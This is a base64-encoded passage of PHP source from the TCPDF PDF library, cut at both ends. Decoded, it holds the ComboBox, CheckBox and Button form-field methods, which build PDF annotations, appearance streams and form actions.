rZXknXV0gPSAkdGhpcy0+Q3VycmVudEZvbnRbJ2knXTsKCQkkZm9udHN0eWxlID0gc3ByaW50ZignL0YlZCAlRiBUZiAlcycsICR0aGlzLT5DdXJyZW50Rm9udFsnaSddLCAkdGhpcy0+Rm9udFNpemVQdCwgJHRoaXMtPlRleHRDb2xvcik7CgkJJHBvcHRbJ2RhJ10gPSAkZm9udHN0eWxlOwoJCS8vIGJ1aWxkIGFwcGVhcmFuY2Ugc3RyZWFtCgkJJHBvcHRbJ2FwJ10gPSBhcnJheSgpOwoJCSRwb3B0WydhcCddWyduJ10gPSAnL1R4IEJNQyBxICcuJGZvbnRzdHlsZS4nICc7CgkJJHRleHQgPSAnJzsKCQlmb3JlYWNoKCR2YWx1ZXMgYXMgJGl0ZW0pIHsKCQkJaWYgKGlzX2FycmF5KCRpdGVtKSkgewoJCQkJJHRleHQgLj0gJGl0ZW1bMV0uIlxuIjsKCQkJfSBlbHNlIHsKCQkJCSR0ZXh0IC49ICRpdGVtLiJcbiI7CgkJCX0KCQl9CgkJJHRtcGlkID0gJHRoaXMtPnN0YXJ0VGVtcGxhdGUoJHcsICRoLCBmYWxzZSk7CgkJJHRoaXMtPk11bHRpQ2VsbCgkdywgJGgsICR0ZXh0LCAwLCAnJywgZmFsc2UsIDAsIDAsIDAsIHRydWUsIDAsIGZhbHNlLCB0cnVlLCAwLCAnVCcsIGZhbHNlKTsKCQkkdGhpcy0+ZW5kVGVtcGxhdGUoKTsKCQktLSR0aGlzLT5uOwoJCSRwb3B0WydhcCddWyduJ10gLj0gJHRoaXMtPnhvYmplY3RzWyR0bXBpZF1bJ291dGRhdGEnXTsKCQl1bnNldCgkdGhpcy0+eG9iamVjdHNbJHRtcGlkXSk7CgkJJHBvcHRbJ2FwJ11bJ24nXSAuPSAnUSBFTUMnOwoJCS8vIG1lcmdlIG9wdGlvbnMKCQkkb3B0ID0gYXJyYXlfbWVyZ2UoJHBvcHQsICRvcHQpOwoJCS8vIHNldCByZW1haW5pbmcgYW5ub3RhdGlvbiBkYXRhCgkJJG9wdFsnU3VidHlwZSddID0gJ1dpZGdldCc7CgkJJG9wdFsnZnQnXSA9ICdDaCc7CgkJJG9wdFsndCddID0gJG5hbWU7CgkJJG9wdFsnb3B0J10gPSAkdmFsdWVzOwoJCXVuc2V0KCRvcHRbJ21rJ11bJ2NhJ10pOwoJCXVuc2V0KCRvcHRbJ21rJ11bJ3JjJ10pOwoJCXVuc2V0KCRvcHRbJ21rJ11bJ2FjJ10pOwoJCXVuc2V0KCRvcHRbJ21rJ11bJ2knXSk7CgkJdW5zZXQoJG9wdFsnbWsnXVsncmknXSk7CgkJdW5zZXQoJG9wdFsnbWsnXVsnaXgnXSk7CgkJdW5zZXQoJG9wdFsnbWsnXVsnaWYnXSk7CgkJdW5zZXQoJG9wdFsnbWsnXVsndHAnXSk7CgkJJHRoaXMtPkFubm90YXRpb24oJHgsICR5LCAkdywgJGgsICRuYW1lLCAkb3B0LCAwKTsKCQlpZiAoJHRoaXMtPnJ0bCkgewoJCQkkdGhpcy0+eCAtPSAkdzsKCQl9IGVsc2UgewoJCQkkdGhpcy0+eCArPSAkdzsKCQl9Cgl9CgoJLyoqCgkgKiBDcmVhdGVzIGEgQ29tYm8tYm94IGZpZWxkCgkgKiBAcGFyYW0gc3RyaW5nICRuYW1lIGZpZWxkIG5hbWUKCSAqIEBwYXJhbSBpbnQgJHcgd2lkdGgKCSAqIEBwYXJhbSBpbnQgJGggaGVpZ2h0CgkgKiBAcGFyYW0gYXJyYXkgJHZhbHVlcyBhcnJheSBjb250YWluaW5nIHRoZSBsaXN0IG9mIHZhbHVlcy4KCSAqIEBwYXJhbSBhcnJheSAkcHJvcCBqYXZhc2NyaXB0IGZpZWxkIHByb3BlcnRpZXMuIFBvc3NpYmxlIHZhbHVlcyBhcmUgZGVzY3JpYmVkIG9uIG9mZmljaWFsIEphdmFzY3JpcHQgZm9yIEFjcm9iYXQgQVBJIHJlZmVyZW5jZS4KCSAqIEBwYXJhbSBhcnJheSAkb3B0IGFubm90YXRpb24gcGFyYW1ldGVycy4gUG9zc2libGUgdmFsdWVzIGFyZSBkZXNjcmliZWQgb24gb2ZmaWNpYWwgUERGMzIwMDBfMjAwOCByZWZlcmVuY2UuCgkgKiBAcGFyYW0gZmxvYXR8bnVsbCAkeCBBYnNjaXNzYSBvZiB0aGUgdXBwZXItbGVmdCBjb3JuZXIgb2YgdGhlIHJlY3RhbmdsZQoJICogQHBhcmFtIGZsb2F0fG51bGwgJHkgT3JkaW5hdGUgb2YgdGhlIHVwcGVyLWxlZnQgY29ybmVyIG9mIHRoZSByZWN0YW5nbGUKCSAqIEBwYXJhbSBib29sZWFuICRqcyBpZiB0cnVlIHB1dCB0aGUgZmllbGQgdXNpbmcgSmF2YVNjcmlwdCAocmVxdWlyZXMgQWNyb2JhdCBXcml0ZXIgdG8gYmUgcmVuZGVyZWQpLgoJICogQHB1YmxpYwoJICogQGF1dGhvciBOaWNvbGEgQXN1bmkKCSAqIEBzaW5jZSA0LjguMDAwICgyMDA5LTA5LTA3KQoJICovCglwdWJsaWMgZnVuY3Rpb24gQ29tYm9Cb3goJG5hbWUsICR3LCAkaCwgJHZhbHVlcywgJHByb3A9YXJyYXkoKSwgJG9wdD1hcnJheSgpLCAkeD1udWxsLCAkeT1udWxsLCAkanM9ZmFsc2UpIHsKCQlpZiAoVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJHgpKSB7CgkJCSR4ID0gJHRoaXMtPng7CgkJfQoJCWlmIChUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkeSkpIHsKCQkJJHkgPSAkdGhpcy0+eTsKCQl9CgkJLy8gY2hlY2sgcGFnZSBmb3Igbm8td3JpdGUgcmVnaW9ucyBhbmQgYWRhcHQgcGFnZSBtYXJnaW5zIGlmIG5lY2Vzc2FyeQoJCWxpc3QoJHgsICR5KSA9ICR0aGlzLT5jaGVja1BhZ2VSZWdpb25zKCRoLCAkeCwgJHkpOwoJCWlmICgkanMpIHsKCQkJJHRoaXMtPl9hZGRmaWVsZCgnY29tYm9ib3gnLCAkbmFtZSwgJHgsICR5LCAkdywgJGgsICRwcm9wKTsKCQkJJHMgPSAnJzsKCQkJZm9yZWFjaCAoJHZhbHVlcyBhcyAkdmFsdWUpIHsKCQkJCWlmIChpc19hcnJheSgkdmFsdWUpKSB7CgkJCQkJJHMgLj0gJyxbXCcnLmFkZHNsYXNoZXMoJHZhbHVlWzFdKS4nXCcsXCcnLmFkZHNsYXNoZXMoJHZhbHVlWzBdKS4nXCddJzsKCQkJCX0gZWxzZSB7CgkJCQkJJHMgLj0gJyxbXCcnLmFkZHNsYXNoZXMoJHZhbHVlKS4nXCcsXCcnLmFkZHNsYXNoZXMoJHZhbHVlKS4nXCddJzsKCQkJCX0KCQkJfQoJCQkkdGhpcy0+amF2YXNjcmlwdCAuPSAnZicuJG5hbWUuJy5zZXRJdGVtcygnLnN1YnN0cigkcywgMSkuJyk7Jy4iXG4iOwoJCQlyZXR1cm47CgkJfQoJCS8vIGdldCBkZWZhdWx0IHN0eWxlCgkJJHByb3AgPSBhcnJheV9tZXJnZSgkdGhpcy0+Z2V0Rm9ybURlZmF1bHRQcm9wKCksICRwcm9wKTsKCQkkcHJvcFsnQ29tYm8nXSA9IHRydWU7CgkJLy8gZ2V0IGFubm90YXRpb24gZGF0YQoJCSRwb3B0ID0gVENQREZfU1RBVElDOjpnZXRBbm5vdE9wdEZyb21KU1Byb3AoJHByb3AsICR0aGlzLT5zcG90X2NvbG9ycywgJHRoaXMtPnJ0bCk7CgkJLy8gc2V0IGFkZGl0aW9uYWwgZGVmYXVsdCBvcHRpb25zCgkJJHRoaXMtPmFubm90YXRpb25fZm9udHNbJHRoaXMtPkN1cnJlbnRGb250Wydmb250a2V5J11dID0gJHRoaXMtPkN1cnJlbnRGb250WydpJ107CgkJJGZvbnRzdHlsZSA9IHNwcmludGYoJy9GJWQgJUYgVGYgJXMnLCAkdGhpcy0+Q3VycmVudEZvbnRbJ2knXSwgJHRoaXMtPkZvbnRTaXplUHQsICR0aGlzLT5UZXh0Q29sb3IpOwoJCSRwb3B0WydkYSddID0gJGZvbnRzdHlsZTsKCQkvLyBidWlsZCBhcHBlYXJhbmNlIHN0cmVhbQoJCSRwb3B0WydhcCddID0gYXJyYXkoKTsKCQkkcG9wdFsnYXAnXVsnbiddID0gJy9UeCBCTUMgcSAnLiRmb250c3R5bGUuJyAnOwoJCSR0ZXh0ID0gJyc7CgkJZm9yZWFjaCgkdmFsdWVzIGFzICRpdGVtKSB7CgkJCWlmIChpc19hcnJheSgkaXRlbSkpIHsKCQkJCSR0ZXh0IC49ICRpdGVtWzFdLiJcbiI7CgkJCX0gZWxzZSB7CgkJCQkkdGV4dCAuPSAkaXRlbS4iXG4iOwoJCQl9CgkJfQoJCSR0bXBpZCA9ICR0aGlzLT5zdGFydFRlbXBsYXRlKCR3LCAkaCwgZmFsc2UpOwoJCSR0aGlzLT5NdWx0aUNlbGwoJHcsICRoLCAkdGV4dCwgMCwgJycsIGZhbHNlLCAwLCAwLCAwLCB0cnVlLCAwLCBmYWxzZSwgdHJ1ZSwgMCwgJ1QnLCBmYWxzZSk7CgkJJHRoaXMtPmVuZFRlbXBsYXRlKCk7CgkJLS0kdGhpcy0+bjsKCQkkcG9wdFsnYXAnXVsnbiddIC49ICR0aGlzLT54b2JqZWN0c1skdG1waWRdWydvdXRkYXRhJ107CgkJdW5zZXQoJHRoaXMtPnhvYmplY3RzWyR0bXBpZF0pOwoJCSRwb3B0WydhcCddWyduJ10gLj0gJ1EgRU1DJzsKCQkvLyBtZXJnZSBvcHRpb25zCgkJJG9wdCA9IGFycmF5X21lcmdlKCRwb3B0LCAkb3B0KTsKCQkvLyBzZXQgcmVtYWluaW5nIGFubm90YXRpb24gZGF0YQoJCSRvcHRbJ1N1YnR5cGUnXSA9ICdXaWRnZXQnOwoJCSRvcHRbJ2Z0J10gPSAnQ2gnOwoJCSRvcHRbJ3QnXSA9ICRuYW1lOwoJCSRvcHRbJ29wdCddID0gJHZhbHVlczsKCQl1bnNldCgkb3B0WydtayddWydjYSddKTsKCQl1bnNldCgkb3B0WydtayddWydyYyddKTsKCQl1bnNldCgkb3B0WydtayddWydhYyddKTsKCQl1bnNldCgkb3B0WydtayddWydpJ10pOwoJCXVuc2V0KCRvcHRbJ21rJ11bJ3JpJ10pOwoJCXVuc2V0KCRvcHRbJ21rJ11bJ2l4J10pOwoJCXVuc2V0KCRvcHRbJ21rJ11bJ2lmJ10pOwoJCXVuc2V0KCRvcHRbJ21rJ11bJ3RwJ10pOwoJCSR0aGlzLT5Bbm5vdGF0aW9uKCR4LCAkeSwgJHcsICRoLCAkbmFtZSwgJG9wdCwgMCk7CgkJaWYgKCR0aGlzLT5ydGwpIHsKCQkJJHRoaXMtPnggLT0gJHc7CgkJfSBlbHNlIHsKCQkJJHRoaXMtPnggKz0gJHc7CgkJfQoJfQoKCS8qKgoJICogQ3JlYXRlcyBhIENoZWNrQm94IGZpZWxkCgkgKiBAcGFyYW0gc3RyaW5nICRuYW1lIGZpZWxkIG5hbWUKCSAqIEBwYXJhbSBpbnQgJHcgd2lkdGgKCSAqIEBwYXJhbSBib29sZWFuICRjaGVja2VkIGRlZmluZSB0aGUgaW5pdGlhbCBzdGF0ZS4KCSAqIEBwYXJhbSBhcnJheSAkcHJvcCBqYXZhc2NyaXB0IGZpZWxkIHByb3BlcnRpZXMuIFBvc3NpYmxlIHZhbHVlcyBhcmUgZGVzY3JpYmVkIG9uIG9mZmljaWFsIEphdmFzY3JpcHQgZm9yIEFjcm9iYXQgQVBJIHJlZmVyZW5jZS4KCSAqIEBwYXJhbSBhcnJheSAkb3B0IGFubm90YXRpb24gcGFyYW1ldGVycy4gUG9zc2libGUgdmFsdWVzIGFyZSBkZXNjcmliZWQgb24gb2ZmaWNpYWwgUERGMzIwMDBfMjAwOCByZWZlcmVuY2UuCgkgKiBAcGFyYW0gc3RyaW5nICRvbnZhbHVlIHZhbHVlIHRvIGJlIHJldHVybmVkIGlmIHNlbGVjdGVkLgoJICogQHBhcmFtIGZsb2F0fG51bGwgJHggQWJzY2lzc2Egb2YgdGhlIHVwcGVyLWxlZnQgY29ybmVyIG9mIHRoZSByZWN0YW5nbGUKCSAqIEBwYXJhbSBmbG9hdHxudWxsICR5IE9yZGluYXRlIG9mIHRoZSB1cHBlci1sZWZ0IGNvcm5lciBvZiB0aGUgcmVjdGFuZ2xlCgkgKiBAcGFyYW0gYm9vbGVhbiAkanMgaWYgdHJ1ZSBwdXQgdGhlIGZpZWxkIHVzaW5nIEphdmFTY3JpcHQgKHJlcXVpcmVzIEFjcm9iYXQgV3JpdGVyIHRvIGJlIHJlbmRlcmVkKS4KCSAqIEBwdWJsaWMKCSAqIEBhdXRob3IgTmljb2xhIEFzdW5pCgkgKiBAc2luY2UgNC44LjAwMCAoMjAwOS0wOS0wNykKCSAqLwoJcHVibGljIGZ1bmN0aW9uIENoZWNrQm94KCRuYW1lLCAkdywgJGNoZWNrZWQ9ZmFsc2UsICRwcm9wPWFycmF5KCksICRvcHQ9YXJyYXkoKSwgJG9udmFsdWU9J1llcycsICR4PW51bGwsICR5PW51bGwsICRqcz1mYWxzZSkgewoJCWlmIChUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkeCkpIHsKCQkJJHggPSAkdGhpcy0+eDsKCQl9CgkJaWYgKFRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCR5KSkgewoJCQkkeSA9ICR0aGlzLT55OwoJCX0KCQkvLyBjaGVjayBwYWdlIGZvciBuby13cml0ZSByZWdpb25zIGFuZCBhZGFwdCBwYWdlIG1hcmdpbnMgaWYgbmVjZXNzYXJ5CgkJbGlzdCgkeCwgJHkpID0gJHRoaXMtPmNoZWNrUGFnZVJlZ2lvbnMoJHcsICR4LCAkeSk7CgkJaWYgKCRqcykgewoJCQkkdGhpcy0+X2FkZGZpZWxkKCdjaGVja2JveCcsICRuYW1lLCAkeCwgJHksICR3LCAkdywgJHByb3ApOwoJCQlyZXR1cm47CgkJfQoJCWlmICghaXNzZXQoJHByb3BbJ3ZhbHVlJ10pKSB7CgkJCSRwcm9wWyd2YWx1ZSddID0gYXJyYXkoJ1llcycpOwoJCX0KCQkvLyBnZXQgZGVmYXVsdCBzdHlsZQoJCSRwcm9wID0gYXJyYXlfbWVyZ2UoJHRoaXMtPmdldEZvcm1EZWZhdWx0UHJvcCgpLCAkcHJvcCk7CgkJJHByb3BbJ2JvcmRlclN0eWxlJ10gPSAnaW5zZXQnOwoJCS8vIGdldCBhbm5vdGF0aW9uIGRhdGEKCQkkcG9wdCA9IFRDUERGX1NUQVRJQzo6Z2V0QW5ub3RPcHRGcm9tSlNQcm9wKCRwcm9wLCAkdGhpcy0+c3BvdF9jb2xvcnMsICR0aGlzLT5ydGwpOwoJCS8vIHNldCBhZGRpdGlvbmFsIGRlZmF1bHQgb3B0aW9ucwoJCSRmb250ID0gJ3phcGZkaW5nYmF0cyc7CgkJaWYgKCR0aGlzLT5wZGZhX21vZGUpIHsKCQkJLy8gYWxsIGZvbnRzIG11c3QgYmUgZW1iZWRkZWQKCQkJJGZvbnQgPSAncGRmYScuJGZvbnQ7CgkJfQoJCSR0aGlzLT5BZGRGb250KCRmb250KTsKCQkkdG1wZm9udCA9ICR0aGlzLT5nZXRGb250QnVmZmVyKCRmb250KTsKCQkkdGhpcy0+YW5ub3RhdGlvbl9mb250c1skdG1wZm9udFsnZm9udGtleSddXSA9ICR0bXBmb250WydpJ107CgkJJGZvbnRzdHlsZSA9IHNwcmludGYoJy9GJWQgJUYgVGYgJXMnLCAkdG1wZm9udFsnaSddLCAkdGhpcy0+Rm9udFNpemVQdCwgJHRoaXMtPlRleHRDb2xvcik7CgkJJHBvcHRbJ2RhJ10gPSAkZm9udHN0eWxlOwoJCS8vIGJ1aWxkIGFwcGVhcmFuY2Ugc3RyZWFtCgkJJHBvcHRbJ2FwJ10gPSBhcnJheSgpOwoJCSRwb3B0WydhcCddWyduJ10gPSBhcnJheSgpOwoJCSRmeCA9ICgoKCR3IC0gJHRoaXMtPmdldEFic0ZvbnRNZWFzdXJlKCR0bXBmb250WydjdyddWzExMF0pKSAvIDIpICogJHRoaXMtPmspOwoJCSRmeSA9ICgoJHcgLSAoKCgkdG1wZm9udFsnZGVzYyddWydBc2NlbnQnXSAtICR0bXBmb250WydkZXNjJ11bJ0Rlc2NlbnQnXSkgKiAkdGhpcy0+Rm9udFNpemVQdCAvIDEwMDApIC8gJHRoaXMtPmspKSAqICR0aGlzLT5rKTsKCQkkcG9wdFsnYXAnXVsnbiddWydZZXMnXSA9IHNwcmludGYoJ3EgJXMgQlQgL0YlZCAlRiBUZiAlRiAlRiBUZCAoJy5jaHIoMTEwKS4nKSBUaiBFVCBRJywgJHRoaXMtPlRleHRDb2xvciwgJHRtcGZvbnRbJ2knXSwgJHRoaXMtPkZvbnRTaXplUHQsICRmeCwgJGZ5KTsKCQkkcG9wdFsnYXAnXVsnbiddWydPZmYnXSA9IHNwcmludGYoJ3EgJXMgQlQgL0YlZCAlRiBUZiAlRiAlRiBUZCAoJy5jaHIoMTExKS4nKSBUaiBFVCBRJywgJHRoaXMtPlRleHRDb2xvciwgJHRtcGZvbnRbJ2knXSwgJHRoaXMtPkZvbnRTaXplUHQsICRmeCwgJGZ5KTsKCQkvLyBtZXJnZSBvcHRpb25zCgkJJG9wdCA9IGFycmF5X21lcmdlKCRwb3B0LCAkb3B0KTsKCQkvLyBzZXQgcmVtYWluaW5nIGFubm90YXRpb24gZGF0YQoJCSRvcHRbJ1N1YnR5cGUnXSA9ICdXaWRnZXQnOwoJCSRvcHRbJ2Z0J10gPSAnQnRuJzsKCQkkb3B0Wyd0J10gPSAkbmFtZTsKCQlpZiAoVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJG9udmFsdWUpKSB7CgkJCSRvbnZhbHVlID0gJ1llcyc7CgkJfQoJCSRvcHRbJ29wdCddID0gYXJyYXkoJG9udmFsdWUpOwoJCWlmICgkY2hlY2tlZCkgewoJCQkkb3B0Wyd2J10gPSBhcnJheSgnL1llcycpOwoJCQkkb3B0WydhcyddID0gJ1llcyc7CgkJfSBlbHNlIHsKCQkJJG9wdFsndiddID0gYXJyYXkoJy9PZmYnKTsKCQkJJG9wdFsnYXMnXSA9ICdPZmYnOwoJCX0KCQkkdGhpcy0+QW5ub3RhdGlvbigkeCwgJHksICR3LCAkdywgJG5hbWUsICRvcHQsIDApOwoJCWlmICgkdGhpcy0+cnRsKSB7CgkJCSR0aGlzLT54IC09ICR3OwoJCX0gZWxzZSB7CgkJCSR0aGlzLT54ICs9ICR3OwoJCX0KCX0KCgkvKioKCSAqIENyZWF0ZXMgYSBidXR0b24gZmllbGQKCSAqIEBwYXJhbSBzdHJpbmcgJG5hbWUgZmllbGQgbmFtZQoJICogQHBhcmFtIGludCAkdyB3aWR0aAoJICogQHBhcmFtIGludCAkaCBoZWlnaHQKCSAqIEBwYXJhbSBzdHJpbmcgJGNhcHRpb24gY2FwdGlvbi4KCSAqIEBwYXJhbSBtaXhlZCAkYWN0aW9uIGFjdGlvbiB0cmlnZ2VyZWQgYnkgcHJlc3NpbmcgdGhlIGJ1dHRvbi4gVXNlIGEgc3RyaW5nIHRvIHNwZWNpZnkgYSBqYXZhc2NyaXB0IGFjdGlvbi4gVXNlIGFuIGFycmF5IHRvIHNwZWNpZnkgYSBmb3JtIGFjdGlvbiBvcHRpb25zIGFzIG9uIHNlY3Rpb24gMTIuNy41IG9mIFBERjMyMDAwXzIwMDguCgkgKiBAcGFyYW0gYXJyYXkgJHByb3AgamF2YXNjcmlwdCBmaWVsZCBwcm9wZXJ0aWVzLiBQb3NzaWJsZSB2YWx1ZXMgYXJlIGRlc2NyaWJlZCBvbiBvZmZpY2lhbCBKYXZhc2NyaXB0IGZvciBBY3JvYmF0IEFQSSByZWZlcmVuY2UuCgkgKiBAcGFyYW0gYXJyYXkgJG9wdCBhbm5vdGF0aW9uIHBhcmFtZXRlcnMuIFBvc3NpYmxlIHZhbHVlcyBhcmUgZGVzY3JpYmVkIG9uIG9mZmljaWFsIFBERjMyMDAwXzIwMDggcmVmZXJlbmNlLgoJICogQHBhcmFtIGZsb2F0fG51bGwgJHggQWJzY2lzc2Egb2YgdGhlIHVwcGVyLWxlZnQgY29ybmVyIG9mIHRoZSByZWN0YW5nbGUKCSAqIEBwYXJhbSBmbG9hdHxudWxsICR5IE9yZGluYXRlIG9mIHRoZSB1cHBlci1sZWZ0IGNvcm5lciBvZiB0aGUgcmVjdGFuZ2xlCgkgKiBAcGFyYW0gYm9vbGVhbiAkanMgaWYgdHJ1ZSBwdXQgdGhlIGZpZWxkIHVzaW5nIEphdmFTY3JpcHQgKHJlcXVpcmVzIEFjcm9iYXQgV3JpdGVyIHRvIGJlIHJlbmRlcmVkKS4KCSAqIEBwdWJsaWMKCSAqIEBhdXRob3IgTmljb2xhIEFzdW5pCgkgKiBAc2luY2UgNC44LjAwMCAoMjAwOS0wOS0wNykKCSAqLwoJcHVibGljIGZ1bmN0aW9uIEJ1dHRvbigkbmFtZSwgJHcsICRoLCAkY2FwdGlvbiwgJGFjdGlvbiwgJHByb3A9YXJyYXkoKSwgJG9wdD1hcnJheSgpLCAkeD1udWxsLCAkeT1udWxsLCAkanM9ZmFsc2UpIHsKCQlpZiAoVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJHgpKSB7CgkJCSR4ID0gJHRoaXMtPng7CgkJfQoJCWlmIChUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkeSkpIHsKCQkJJHkgPSAkdGhpcy0+eTsKCQl9CgkJLy8gY2hlY2sgcGFnZSBmb3Igbm8td3JpdGUgcmVnaW9ucyBhbmQgYWRhcHQgcGFnZSBtYXJnaW5zIGlmIG5lY2Vzc2FyeQoJCWxpc3QoJHgsICR5KSA9ICR0aGlzLT5jaGVja1BhZ2VSZWdpb25zKCRoLCAkeCwgJHkpOwoJCWlmICgkanMpIHsKCQkJJHRoaXMtPl9hZGRmaWVsZCgnYnV0dG9uJywgJG5hbWUsICR0aGlzLT54LCAkdGhpcy0+eSwgJHcsICRoLCAkcHJvcCk7CgkJCSR0aGlzLT5qYXZhc2NyaXB0IC49ICdmJy4kbmFtZS4iLmJ1dHRvblNldENhcHRpb24oJyIuYWRkc2xhc2hlcygkY2FwdGlvbikuIicpO1xuIjsKCQkJJHRoaXMtPmphdmFzY3JpcHQgLj0gJ2YnLiRuYW1lLiIuc2V0QWN0aW9uKCdNb3VzZVVwJywnIi5hZGRzbGFzaGVzKCRhY3Rpb24pLiInKTtcbiI7CgkJCSR0aGlzLT5qYXZhc2NyaXB0IC49ICdmJy4kbmFtZS4iLmhpZ2hsaWdodD0ncHVzaCc7XG4iOwoJCQkkdGhpcy0+amF2YXNjcmlwdCAuPSAnZicuJG5hbWUuIi5wcmludD1mYWxzZTtcbiI7CgkJCXJldHVybjsKCQl9CgkJLy8gZ2V0IGRlZmF1bHQgc3R5bGUKCQkkcHJvcCA9IGFycmF5X21lcmdlKCR0aGlzLT5nZXRGb3JtRGVmYXVsdFByb3AoKSwgJHByb3ApOwoJCSRwcm9wWydQdXNoYnV0dG9uJ10gPSAndHJ1ZSc7CgkJJHByb3BbJ2hpZ2hsaWdodCddID0gJ3B1c2gnOwoJCSRwcm9wWydkaXNwbGF5J10gPSAnZGlzcGxheS5ub1ByaW50JzsKCQkvLyBnZXQgYW5ub3RhdGlvbiBkYXRhCgkJJHBvcHQgPSBUQ1BERl9TVEFUSUM6OmdldEFubm90T3B0RnJvbUpTUHJvcCgkcHJvcCwgJHRoaXMtPnNwb3RfY29sb3JzLCAkdGhpcy0+cnRsKTsKCQkkdGhpcy0+YW5ub3RhdGlvbl9mb250c1skdGhpcy0+Q3VycmVudEZvbnRbJ2ZvbnRrZXknXV0gPSAkdGhpcy0+Q3VycmVudEZvbnRbJ2knXTsKCQkkZm9udHN0eWxlID0gc3ByaW50ZignL0YlZCAlRiBUZiAlcycsICR0aGlzLT5DdXJyZW50Rm9udFsnaSddLCAkdGhpcy0+Rm9udFNpemVQdCwgJHRoaXMtPlRleHRDb2xvcik7CgkJJHBvcHRbJ2RhJ10gPSAkZm9udHN0eWxlOwoJCS8vIGJ1aWxkIGFwcGVhcmFuY2Ugc3RyZWFtCgkJJHBvcHRbJ2FwJ10gPSBhcnJheSgpOwoJCSRwb3B0WydhcCddWyduJ10gPSAnL1R4IEJNQyBxICcuJGZvbnRzdHlsZS4nICc7CgkJJHRtcGlkID0gJHRoaXMtPnN0YXJ0VGVtcGxhdGUoJHcsICRoLCBmYWxzZSk7CgkJJGJ3ID0gKDIgLyAkdGhpcy0+ayk7IC8vIGJvcmRlciB3aWR0aAoJCSRib3JkZXIgPSBhcnJheSgKCQkJJ0wnID0+IGFycmF5KCd3aWR0aCcgPT4gJGJ3LCAnY2FwJyA9PiAnc3F1YXJlJywgJ2pvaW4nID0+ICdtaXRlcicsICdkYXNoJyA9PiAwLCAnY29sb3InID0+IGFycmF5KDIzMSkpLAoJCQknUicgPT4gYXJyYXkoJ3dpZHRoJyA9PiAkYncsICdjYXAnID0+ICdzcXVhcmUnLCAnam9pbicgPT4gJ21pdGVyJywgJ2Rhc2gnID0+IDAsICdjb2xvcicgPT4gYXJyYXkoNTEpKSwKCQkJJ1QnID0+IGFycmF5KCd3aWR0aCcgPT4gJGJ3LCAnY2FwJyA9PiAnc3F1YXJlJywgJ2pvaW4nID0+ICdtaXRlcicsICdkYXNoJyA9PiAwLCAnY29sb3InID0+IGFycmF5KDIzMSkpLAoJCQknQicgPT4gYXJyYXkoJ3dpZHRoJyA9PiAkYncsICdjYXAnID0+ICdzcXVhcmUnLCAnam9pbicgPT4gJ21pdGVyJywgJ2Rhc2gnID0+IDAsICdjb2xvcicgPT4gYXJyYXkoNTEpKSk7CgkJJHRoaXMtPnNldEZpbGxDb2xvcigyMDQpOwoJCSR0aGlzLT5DZWxsKCR3LCAkaCwgJGNhcHRpb24sICRib3JkZXIsIDAsICdDJywgdHJ1ZSwgJycsIDEsIGZhbHNlLCAnVCcsICdNJyk7CgkJJHRoaXMtPmVuZFRlbXBsYXRlKCk7CgkJLS0kdGhpcy0+bjsKCQkkcG9wdFsnYXAnXVsnbiddIC49ICR0aGlzLT54b2JqZWN0c1skdG1waWRdWydvdXRkYXRhJ107CgkJdW5zZXQoJHRoaXMtPnhvYmplY3RzWyR0bXBpZF0pOwoJCSRwb3B0WydhcCddWyduJ10gLj0gJ1EgRU1DJzsKCQkvLyBzZXQgYWRkaXRpb25hbCBkZWZhdWx0IG9wdGlvbnMKCQlpZiAoIWlzc2V0KCRwb3B0WydtayddKSkgewoJCQkkcG9wdFsnbWsnXSA9IGFycmF5KCk7CgkJfQoJCSRhbm5fb2JqX2lkID0gKCR0aGlzLT5uICsgMSk7CgkJaWYgKCFlbXB0eSgkYWN0aW9uKSBBTkQgIWlzX2FycmF5KCRhY3Rpb24pKSB7CgkJCSRhbm5fb2JqX2lkID0gKCR0aGlzLT5uICsgMik7CgkJfQoJCSRwb3B0WydtayddWydjYSddID0gJHRoaXMtPl90ZXh0c3RyaW5nKCRjYXB0aW9uLCAkYW5uX29ial9pZCk7CgkJJHBvcHRbJ21rJ11bJ3JjJ10gPSAkdGhpcy0+X3RleHRzdHJpbmcoJGNhcHRpb24sICRhbm5fb2JqX2lkKTsKCQkkcG9wdFsnbWsnXVsnYWMnXSA9ICR0aGlzLT5fdGV4dHN0cmluZygkY2FwdGlvbiwgJGFubl9vYmpfaWQpOwoJCS8vIG1lcmdlIG9wdGlvbnMKCQkkb3B0ID0gYXJyYXlfbWVyZ2UoJHBvcHQsICRvcHQpOwoJCS8vIHNldCByZW1haW5pbmcgYW5ub3RhdGlvbiBkYXRhCgkJJG9wdFsnU3VidHlwZSddID0gJ1dpZGdldCc7CgkJJG9wdFsnZnQnXSA9ICdCdG4nOwoJCSRvcHRbJ3QnXSA9ICRjYXB0aW9uOwoJCSRvcHRbJ3YnXSA9ICRuYW1lOwoJCWlmICghZW1wdHkoJGFjdGlvbikpIHsKCQkJaWYgKGlzX2FycmF5KCRhY3Rpb24pKSB7CgkJCQkvLyBmb3JtIGFjdGlvbiBvcHRpb25zIGFzIG9uIHNlY3Rpb24gMTIuNy41IG9mIFBERjMyMDAwXzIwMDguCgkJCQkkb3B0WydhYSddID0gJy9EIDw8JzsKCQkJCSRibW9kZSA9IGFycmF5KCdTdWJtaXRGb3JtJywgJ1Jlc2V0Rm9ybScsICdJbXBvcnREYXRhJyk7CgkJCQlmb3JlYWNoICgkYWN0aW9uIEFTICRrZXkgPT4gJHZhbCkgewoJCQkJCWlmICgoJGtleSA9PSAnUycpIEFORCBpbl9hcnJheSgkdmFsLCAkYm1vZGUpKSB7CgkJCQkJCSRvcHRbJ2FhJ10gLj0gJyAvUyAvJy4kdmFsOwoJCQkJCX0gZWxzZWlmICgoJGtleSA9PSAnRicpIEFORCAoIWVtcHR5KCR2YWwpKSkgewoJCQkJCQkkb3B0WydhYSddIC49ICcgL0YgJy4kdGhpcy0+X2RhdGFzdHJpbmcoJHZhbCwgJGFubl9vYmpfaWQpOwoJCQkJCX0gZWxzZWlmICgoJGtleSA9PSAnRmllbGRzJykgQU5EIGlzX2FycmF5KCR2YWwpIEFORCAhZW1wdHkoJHZhbCkpIHsKCQkJCQkJJG9wdFsnYWEnXSAuPSAnIC9GaWVsZHMgWyc7CgkJCQkJCWZvcmVhY2ggKCR2YWwgQVMgJGZpZWxkKSB7CgkJCQkJCQkkb3B0WydhYSd